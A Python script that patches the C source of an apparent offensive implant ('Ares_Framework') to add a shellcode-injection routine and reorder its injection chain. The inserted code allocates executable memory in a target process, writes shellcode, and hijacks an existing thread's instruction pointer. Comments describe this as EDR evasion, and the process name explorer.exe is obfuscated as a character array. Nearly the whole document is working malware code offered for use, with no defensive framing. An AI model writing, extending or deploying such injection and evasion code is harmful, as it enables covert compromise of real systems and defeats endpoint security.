#!/usr/bin/env python3
"""Patch inject.c: add Pool Party + update InjectSmart to 5-technique chain."""
import os, sys

path = r'C:\Users\Admin\.openclaw\workspace\Ares_Framework\agent\native\inject.c'

with open(path, 'r', encoding='utf-8', errors='replace') as f:
    content = f.read()

POOL_PARTY = """
/* ===============================================================
 *  Pool Party Injection (v3.9) -- Thread pool worker hijack
 *
 *  Why it evades EDR:
 *    - No NtCreateThreadEx or NtQueueApcThread signals
 *    - Hijacks an EXISTING thread in target (no thread creation)
 *    - SetThreadContext + RIP redirect on suspended thread
 *    - Execution stack looks like normal thread pool dispatch
 *
 *  Steps:
 *    1. NtAllocateVirtualMemory + write shellcode (RX)
 *    2. NtQuerySystemInformation -> find thread in target pid
 *    3. SuspendThread -> redirect RIP -> ResumeThread
 * =============================================================== */

BOOL Ares_Inject_PoolParty(AGENT_STATE* state,
    DWORD target_pid,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    if (!state || !shellcode || shellcode_len == 0 || target_pid == 0)
        return FALSE;

    HANDLE hProcess = NULL;
    NTSTATUS st = Ares_NtOpenProcess(state, &hProcess,
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION, target_pid);
    if (!NT_SUCCESS(st) || !hProcess) return FALSE;

    PVOID remoteBase = NULL;
    SIZE_T allocSize = shellcode_len;
    st = Ares_NtAllocateVirtualMemory(state, hProcess, &remoteBase, 0,
        &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) { CloseHandle(hProcess); return FALSE; }

    SIZE_T written = 0;
    st = Ares_NtWriteVirtualMemory(state, hProcess, remoteBase,
        (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        CloseHandle(hProcess); return FALSE;
    }

    ULONG oldProt = 0;
    SIZE_T regionSz = shellcode_len;
    Ares_NtProtectVirtualMemory(state, hProcess, &remoteBase, &regionSz,
        PAGE_EXECUTE_READ, &oldProt);

    /* Find a thread in target via NtQuerySystemInformation */
    typedef NTSTATUS (NTAPI *PNtQSI)(ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PNtQSI pNtQSI = (PNtQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQSI) { CloseHandle(hProcess); return FALSE; }

    ULONG bufSize = 0x80000;
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(hProcess); return FALSE; }

    for (int retry = 0; retry < 4; retry++) {
        ULONG needed = 0;
        NTSTATUS s2 = pNtQSI(5, buf, bufSize, &needed);
        if (s2 == 0) break;
        if (s2 == 0xC0000004L) {
            VirtualFree(buf, 0, MEM_RELEASE);
            bufSize = needed + 0x4000;
            buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (!buf) { CloseHandle(hProcess); return FALSE; }
        } else break;
    }

    HANDLE hThread = NULL;
    BYTE* cur = buf;
    while (cur) {
        ULONG nextOff  = *(ULONG*)cur;
        ULONG thrCount = *(ULONG*)(cur + 4);
        HANDLE pid_h   = *(HANDLE*)(cur + 0x50);
        if ((DWORD)(ULONG_PTR)pid_h == target_pid && thrCount > 0) {
            BYTE* te = cur + 0x100;
            for (ULONG ti = 0; ti < thrCount; ti++) {
                DWORD tid = (DWORD)(ULONG_PTR)(*(HANDLE*)(te + 0x10));
                if (tid && tid != GetCurrentThreadId()) {
                    HANDLE ht = OpenThread(
                        THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|
                        THREAD_SUSPEND_RESUME|THREAD_QUERY_INFORMATION,
                        FALSE, tid);
                    if (ht) { hThread = ht; break; }
                }
                te += 0x80;
            }
            break;
        }
        if (!nextOff) break;
        cur += nextOff;
    }
    VirtualFree(buf, 0, MEM_RELEASE);

    if (!hThread) { CloseHandle(hProcess); return FALSE; }

    if (SuspendThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread); CloseHandle(hProcess); return FALSE;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        CloseHandle(hThread); CloseHandle(hProcess); return FALSE;
    }

    ctx.Rip = (DWORD64)remoteBase;
    ctx.Rsp &= ~0xFULL; /* 16-byte align RSP (x64 ABI) */
    BOOL ok = SetThreadContext(hThread, &ctx);

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return ok;
}

"""

INJECT_SMART_OLD = (
    "int Ares_InjectSmart(AGENT_STATE* state,\n"
    "    const char* target_process,\n"
    "    const BYTE* shellcode, SIZE_T shellcode_len)\n"
    "{\n"
    "    /* 1. Threadless"
)

INJECT_SMART_NEW = (
    "int Ares_InjectSmart(AGENT_STATE* state,\n"
    "    const char* target_process,\n"
    "    const BYTE* shellcode, SIZE_T shellcode_len)\n"
    "{\n"
    "    /* Resolve PID for Pool Party */\n"
    "    DWORD pp_pid = 0;\n"
    "    if (target_process) pp_pid = find_process(target_process);\n"
    "    if (!pp_pid) {\n"
    "        static const char _xpl[] = "
    "{'e','x','p','l','o','r','e','r','.','e','x','e',0};\n"
    "        pp_pid = find_process(_xpl);\n"
    "    }\n\n"
    "    /* 1. Pool Party -- hijack existing thread, no NtCreateThreadEx */\n"
    "    if (pp_pid && Ares_Inject_PoolParty(state, pp_pid, shellcode, shellcode_len))\n"
    "        return 1;\n\n"
    "    /* 2. Threadless"
)

# Find InjectSmart location
idx = content.find("int Ares_InjectSmart(")
if idx == -1:
    print("ERROR: InjectSmart not found"); sys.exit(1)

# Find banner comment before it
banner_start = content.rfind("/*", 0, idx)
insert_at = banner_start if banner_start != -1 and (idx - banner_start) < 700 else idx

# Insert Pool Party
new_content = content[:insert_at] + POOL_PARTY + content[insert_at:]

# Update InjectSmart signature
if INJECT_SMART_OLD in new_content:
    new_content = new_content.replace(INJECT_SMART_OLD, INJECT_SMART_NEW, 1)
    print("InjectSmart updated")
else:
    print("WARNING: InjectSmart old text not matched exactly")

with open(path, 'w', encoding='utf-8') as f:
    f.write(new_content)

print(f"inject.c: {os.path.getsize(path)} bytes, {new_content.count(chr(10))} lines")
print("Pool Party + 5-technique InjectSmart chain DONE")
